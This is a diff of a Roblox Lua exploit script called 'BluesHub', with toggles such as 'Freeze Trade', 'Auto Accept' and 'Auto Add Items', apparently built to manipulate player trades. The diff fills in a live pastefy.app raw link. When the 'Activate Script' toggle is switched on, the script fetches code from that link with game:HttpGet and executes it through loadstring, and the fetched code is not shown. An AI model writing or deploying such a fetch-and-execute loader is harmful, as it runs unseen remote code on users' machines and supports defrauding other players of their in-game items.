@@ -1,3 +1,4 @@
+-- [[BluesHub Source]]
 -- Services
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
@@ -115,12 +116,12 @@ makeToggle("Freeze Trade", 56)
 makeToggle("Auto Accept", 94)
 makeToggle("Auto Add Items", 132)
 
--- script will execute from another repritory when clicked activate
+-- script will execute from another respritory when clicked activate
 makeToggle("Activate Script", 170, function(state)
     if state then
         local success, response = pcall(function()
-            -- put github raw link for execution
-            return game:HttpGet("")
+            -- put github/pastefy raw link for execution
+            return game:HttpGet("https://pastefy.app/8HAIQlIb/raw")
         end)
         if success then
             local func, loadErr = loadstring(response)
